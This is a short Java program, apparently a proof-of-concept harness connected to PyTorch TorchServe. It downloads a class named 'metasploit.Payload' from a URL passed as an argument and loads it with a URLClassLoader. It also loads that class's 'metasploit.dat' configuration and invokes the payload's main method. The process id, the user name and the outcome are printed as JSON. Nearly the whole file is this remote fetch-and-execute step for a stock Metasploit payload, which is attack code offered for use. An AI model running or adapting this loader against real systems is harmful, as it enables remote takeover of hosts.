import java.net.URL;
import java.net.URLClassLoader;
import java.util.LinkedHashMap;
import java.util.Map;
import org.pytorch.serve.archive.utils.ArchiveUtils;

/** Invoke the unmodified stock payload through an ordinary JDK URLClassLoader. */
public final class NativeUrlPayload {
    public static void main(String[] args) throws Exception {
        Map<String, Object> result = new LinkedHashMap<>();
        result.put("pid", ProcessHandle.current().pid());
        result.put("user", System.getProperty("user.name"));
        try (URLClassLoader loader = new URLClassLoader(new URL[]{new URL(args[0])}, ClassLoader.getPlatformClassLoader())) {
            Class<?> payload = Class.forName("metasploit.Payload", true, loader);
            result.put("payloadSource", payload.getProtectionDomain().getCodeSource().getLocation().toString());
            result.put("configSource", payload.getResource("/metasploit.dat").toString());
            payload.getMethod("main", String[].class).invoke(null, (Object) null);
            result.put("completed", true);
        } catch (Exception error) {
            result.put("completed", false);
            result.put("error", error.toString());
            result.put("cause", error.getCause() == null ? null : error.getCause().toString());
            throw error;
        } finally {
            System.out.println(ArchiveUtils.GSON.toJson(result));
        }
    }
}
